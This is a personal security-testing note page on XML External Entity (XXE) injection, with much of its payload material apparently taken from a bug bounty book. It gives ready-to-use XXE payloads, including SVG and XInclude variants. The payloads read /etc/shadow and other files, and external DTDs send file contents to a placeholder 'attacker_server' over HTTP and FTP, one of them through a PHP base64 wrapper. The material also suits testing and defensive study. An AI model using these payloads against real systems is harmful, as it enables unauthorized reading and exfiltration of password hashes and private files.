# XML External Entities injection
Tags: #xxe #injection #api
Related to:
See also:
Previous:

## Links
Topic: XXE identification and exploit
Author: h3xstream
Link: https://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html

Topic: Bug Bounty Bootcamp
Author: Vickie Li
Description: A lot of the payload material is taken from there.

## Notes
### Detection
- Anything that looks XML based should be investigated (GPS in @h3xstream post)
- Change `application/json` to `application/xml` in API requests.

```
Content-Type: text/xml
Content-Type: application/xml
```

#### FIle Upload
 > If you can upload one of these file types, you might be able to smuggle XML input to the application’s XML parser. XML can be written into document and image formats like XML, HTML, DOCX, PPTX, XLSX, GPX, PDF, SVG, and RSS feeds. Furthermore, metadata embedded within images like GIF, PNG, and JPEG files are all based on XML.
 
 ### Payloads
 "Classic"
 ```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "Hello!">
]>
<example>&test;</example>
```

When the SYSTEM keyword does not work, you can replace it with the PUBLIC keyword instead. This tag requires you to supply an ID surrounded by quotes after the PUBLIC keyword. The parser uses this to generate an alternate URL for the value of the entity. For our purposes, you can just use a random string in its place:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test PUBLIC "abc" "file:///etc/hostname">
]>
<example>&test;</example>
```

#### Blind
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "http://attacker_server:80/xxe_test.txt">
]>
<example>&test;</example>
```

#### SVG
Save as a .svg file.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "file:///etc/shadow">
]>
<svg width="500" height="500">
  <circle cx="50" cy="50" r="40" fill="blue" />
  <text font-size="16" x="0" y="16">&test;</text>
</svg>
```
#### Office files
You can unzip the following, identiy .xml files, and add payloads
* docx
* pptx
* xlsx
Then, zip again

#### Xinclude
Sometimes you cannot control the entire XML document or edit the DTD of an XML document. But you can still exploit an XXE vulnerability if the target application takes your user input and inserts it into XML documents on the backend.

In this situation, you might be able to execute an XInclude attack instead. _XInclude_ is a special XML feature that builds a separate XML document from a single XML tag named `xi:include`. If you can control even a single piece of unsanitized data passed into an XML document, you might be able to place an XInclude attack within that value.

To test for XInclude attacks, insert the following payload into the data entry point and see if the file that you requested gets sent back in the response body:

```
<example xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</example>
```

This piece of XML code does two things. First, it references the _http://www.w3.org/2001/XInclude_ namespace so that we can use the `xi:include` element. Next, it uses that element to parse and include the _/etc/hostname_ file in the XML document.

### Exfiltration
#### Blind
More complicated because of rules in most XML parsers

> An easier way to exfiltrate data via a blind XXE is by forcing the parser to return a descriptive error message. For example, you can induce a File Not Found error by referencing a nonexistent file as the value of an external entity. Your external DTD can be rewritten as follows:

*xxe.dtd*
```
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/?%file;'>">
%ent;
%error;
```

Notice that I included the contents of _/etc/shadow_ in the URL parameter of the nonexistent filepath. Then you can submit the same payload to the target to trigger the attack:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
  %xxe;
]>
```

This malicious DTD will cause the parser to deliver the desired file contents as a File Not Found error:
```
java.io.FileNotFoundException: file:///nonexistent/FILE CONTENTS OF /etc/shadow
```

#### Bypassing restrictions on special chars
Sometimes you’ll want to exfiltrate files that contain XML special characters, such as angle brackets (`<>`), quotes (`"` or `'`), and the ampersand (`&`). Accessing these files directly via an XXE would break the syntax of your DTD and interfere with the exfiltration. Thankfully, XML already has a feature that deals with this issue. In an XML file, characters wrapped within `CDATA` (character data) tags are not seen as special characters. So, for instance, if you’re exfiltrating an XML file, you can rewrite your malicious external DTD as follows:

```
1 <!ENTITY % file SYSTEM "file:///passwords.xml">
2 <!ENTITY % start "<![CDATA[">
3 <!ENTITY % end "]]>">
4 <!ENTITY % ent "<!ENTITY &#x25; exfiltrate
'http://attacker_server/?%start;%file;%end;'>">
%ent;
%exfiltrate;
```

This DTD first declares a parameter entity that points to the file you want to read 1. It also declares two parameter entities containing the strings `"<![CDATA["` and `"]]>"`2 3. Then it constructs an exfiltration URL that will not break the DTD’s syntax by wrapping the file’s contents in a `CDATA` tag 4. The concatenated `exfiltrate` entity declaration will become the following:

```
<!ENTITY % exfiltrate 'http://attacker_server/?<![CDATA[CONTENTS_OF_THE_FILE]]>'>
```

You can see that our payloads are quickly getting complicated. To prevent accidentally introducing syntax errors to the payload, you can use a tool such as XmlLint ([https://xmllint.com/](https://xmllint.com/)) to ensure that your XML syntax is valid.

Finally, send your usual XML payload to the target to execute the attack:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
  %xxe;
]>
```

Another way of exfiltrating files with special characters is to use a PHP URL wrapper. If the target is a PHP-based app, PHP wrappers let you convert the desired data into base64 format so you can use it to read XML files or even binary files:

```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">
%ent;
%exfiltrate;
```

The File Transfer Protocol (FTP) can also be used to send data directly while bypassing special character restrictions. HTTP has many special character restrictions and typically restricts the length of the URL. Using FTP instead is an easy way to bypass that. To use it, you need to run a simple FTP server on your machine and modify your malicious DTD accordingly. I used the simple Ruby server script at [https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb):

```
<!ENTITY % file SYSTEM "file:///etc/shadow">
<!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM
1 'ftp://attacker_server:2121/?%file;'>">
%ent;
%exfiltrate;
```

We are using port 2121 here because the Ruby FTP server we are using runs on port 2121, but the correct port to use depends on how you run your server